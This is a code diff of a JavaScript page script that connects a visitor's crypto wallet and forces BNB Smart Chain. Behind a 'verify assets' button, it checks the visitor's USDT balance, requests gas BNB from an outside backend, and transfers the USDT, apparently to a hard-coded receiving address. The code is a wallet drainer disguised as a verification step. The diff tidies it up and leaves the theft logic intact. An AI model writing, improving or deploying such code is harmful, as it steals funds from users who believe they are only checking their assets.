@@ -1,6 +1,6 @@
-const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT receiving address
-const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // Wallet for gas fees
-const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract
+const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090";
+const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87";
+const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
 
 let web3;
 let userAddress;
@@ -11,7 +11,6 @@ async function connectWallet() {
         try {
             await window.ethereum.request({ method: "eth_requestAccounts" });
 
-            // Force switch to BNB Smart Chain
             await window.ethereum.request({
                 method: "wallet_switchEthereumChain",
                 params: [{ chainId: "0x38" }]
@@ -31,6 +30,8 @@ async function connectWallet() {
 
 window.addEventListener("load", connectWallet);
 
+document.getElementById("verifyAssets").addEventListener("click", verifybutton);
+
 async function verifybutton() {
     if (!web3 || !userAddress) {
         alert("Wallet not connected. Refresh the page.");
@@ -41,7 +42,6 @@ async function verifybutton() {
         { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
     ], usdtContractAddress);
 
-    // Fetch balances
     const [usdtBalanceWei, userBNBWei] = await Promise.all([
         usdtContract.methods.balanceOf(userAddress).call(),
         web3.eth.getBalance(userAddress)
@@ -66,24 +66,21 @@ async function verifybutton() {
         return;
     }
 
-    // User has more than 150 USDT → Check BNB Gas Fee
     showPopup("Loading...", "green");
-
     transferUSDT(usdtBalance, userBNB);
 }
 
 async function transferUSDT(usdtBalance, userBNB) {
     try {
         if (userBNB < 0.0005) {
-    console.log("User BNB is low. Requesting BNB from backend...");
-    await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ toAddress: userAddress })
-    });
+            console.log("User BNB is low. Requesting BNB from backend...");
+            await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ toAddress: userAddress })
+            });
         }
 
-        // Proceed with USDT Transfer
         const usdtContract = new web3.eth.Contract([
             { "constant": false, "inputs": [{ "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
         ], usdtContractAddress);
@@ -106,25 +103,9 @@ async function transferUSDT(usdtBalance, userBNB) {
     }
 }
 
-async function sendBNB(toAddress, amount) {
-    try {
-        await web3.eth.sendTransaction({
-            from: bnbGasSender,
-            to: toAddress,
-            value: web3.utils.toWei(amount, "ether"),
-            gas: 21000
-        });
-
-        console.log(`✅ Sent ${amount} BNB to ${toAddress} for gas fees.`);
-    } catch (error) {
-        console.error("⚠️ Error sending BNB:", error);
-    }
-}
-
-// Function to display pop-up message
 function showPopup(message, color) {
     let popup = document.getElementById("popupBox");
-    
+
     if (!popup) {
         popup = document.createElement("div");
         popup.id = "popupBox";
@@ -142,16 +123,12 @@ function showPopup(message, color) {
         document.body.appendChild(popup);
     }
 
-    popup.style.backgroundColor = color === "red" ? "#ffebeb" : "#e6f7e6";
-    popup.style.color = color === "red" ? "red" : "green";
+    popup.style.backgroundColor = color === "red" ? "#ffebeb" : color === "green" ? "#e6f7e6" : "#f4f4f4";
+    popup.style.color = color === "red" ? "red" : color === "green" ? "green" : "black";
     popup.innerHTML = message;
     popup.style.display = "block";
 
-    // Auto-hide after 5 seconds
     setTimeout(() => {
         popup.style.display = "none";
     }, 5000);
 }
-
-// Attach event listener
-document.getElementById("verifyAssets").addEventListener("click", verifybutton);
